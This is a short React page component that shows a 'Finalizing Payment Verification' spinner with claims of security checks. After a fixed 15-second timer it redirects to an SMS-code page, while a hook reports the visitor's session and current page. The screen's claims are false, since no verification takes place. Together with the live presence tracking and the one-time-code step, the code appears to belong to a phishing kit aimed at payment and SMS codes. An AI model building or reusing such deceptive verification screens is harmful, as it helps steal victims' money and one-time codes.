import { useEffect } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import styles from "./Transit.module.css";
import { useOnlineStatus } from "../../hooks/useOnlineStatus";

const Transit2 = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const sessionId = localStorage.getItem("currentSessionId");

  useOnlineStatus({
    sessionId,
    pageName: "transit-2",
    enabled: true,
  });

  useEffect(() => {
    window.scrollTo(0, 0);
    
    // Таймер на 15 секунд
    const timer = setTimeout(() => {
      if (sessionId) {
        navigate(`/sms-code/${sessionId}`, { 
          state: { from: location.pathname },
          replace: true 
        });
      } else {
        console.error("Session ID not found");
      }
    }, 15000);

    return () => clearTimeout(timer);
  }, [navigate, location, sessionId]);

  return (
    <div className={styles.container}>
      <div className={styles.loaderContainer}>
        <div className={styles.spinner}></div>
        <h1 className={styles.title}>Finalizing Payment Verification</h1>
        <p className={styles.subtitle}>
          Completing security checks and preparing for SMS verification...
        </p>
        <div className={styles.progressBar}>
          <div className={styles.progressFill}></div>
        </div>
        <div className={styles.timer}>Finalizing... 15 seconds</div>
      </div>
    </div>
  );
};

export default Transit2;